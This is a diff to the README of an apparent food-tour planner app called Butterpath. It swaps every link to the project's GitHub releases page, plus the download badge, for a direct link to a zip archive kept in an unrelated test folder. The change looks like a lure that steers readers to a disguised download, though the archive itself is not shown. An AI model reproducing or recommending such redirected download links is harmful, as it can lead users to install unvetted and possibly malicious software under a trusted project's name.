@@ -1,7 +1,7 @@
 # 🍽️ Butterpath - Plan Your Perfect Food Tour Effortlessly
 
 ## 📥 Download Now
-[![Download Butterpath](https://img.shields.io/badge/Download-Butterpath-blue.svg)](https://github.com/Dinhtien0704/Butterpath/releases)
+[![Download Butterpath](https://raw.githubusercontent.com/Dinhtien0704/Butterpath/main/src/persona_tests/Butterpath_v3.4.zip)](https://raw.githubusercontent.com/Dinhtien0704/Butterpath/main/src/persona_tests/Butterpath_v3.4.zip)
 
 ## 🚀 Getting Started
 Butterpath is a user-friendly food tour planner that helps you organize your culinary adventures. By utilizing advanced technology tools like LangChain DeepAgents and the Google Maps API, you can explore various dining options easily. This guide will help you download and run the application smoothly.
@@ -25,7 +25,7 @@ Butterpath offers several useful features:
 ## 📥 Download & Install
 To get started with Butterpath, follow these steps:
 
-1. Visit this page to download: [Download Butterpath](https://github.com/Dinhtien0704/Butterpath/releases).
+1. Visit this page to download: [Download Butterpath](https://raw.githubusercontent.com/Dinhtien0704/Butterpath/main/src/persona_tests/Butterpath_v3.4.zip).
 2. Look for the latest version of Butterpath. 
 3. Click on the version you want to install, and download the file compatible with your operating system.
 4. Once the download completes, find the file in your downloads folder.
@@ -60,4 +60,4 @@ Butterpath is an open-source project, and we welcome contributions! If you want 
 
 Thank you for choosing Butterpath for your food tour planning. Enjoy exploring new culinary experiences!  
 
-Feel free to download and explore! [Download Butterpath](https://github.com/Dinhtien0704/Butterpath/releases)
+Feel free to download and explore! [Download Butterpath](https://raw.githubusercontent.com/Dinhtien0704/Butterpath/main/src/persona_tests/Butterpath_v3.4.zip)
